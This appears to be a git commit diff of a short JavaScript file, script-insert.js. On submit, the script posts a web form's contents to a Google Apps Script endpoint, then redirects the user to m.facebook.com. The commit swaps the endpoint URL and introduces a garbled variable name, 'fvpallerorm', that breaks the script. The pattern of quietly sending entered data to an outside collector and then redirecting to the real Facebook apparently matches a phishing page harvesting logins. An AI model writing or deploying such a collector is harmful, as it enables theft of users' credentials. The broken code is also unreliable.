10ea88b79416e11b6f081574973402141829fa6f
vestaddbox@gmail.com <vestaddbox@gmail.com>
2022-08-08 19:23:30 +0100

    paller

--- script-insert.js
+++ script-insert.js
@@ -1,11 +1,11 @@
 const form = document.querySelector("#form")
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwqu2btfSHvJvk-ZBpGoNC1A4u557Wiy3eYNfuv_Rb1UBXUDDgMLI81urCxAR3SnK5v/exec'
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbz-yMRRlPdzAfEp5jtjgs0Hbqt7cb-7voow1eWMkVw0HE89qZYnvNbtBgNiEFKUNNQU/exec'
 
     form.addEventListener('submit', e => {
       e.preventDefault()
 
       console.log(form)
-      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+      fetch(scriptURL, { method: 'POST', body: new FormData(fvpallerorm) })
         .then(response => { window.location.href='http://m.facebook.com' })
         .catch(error => alert('Error!', error.message))
     })
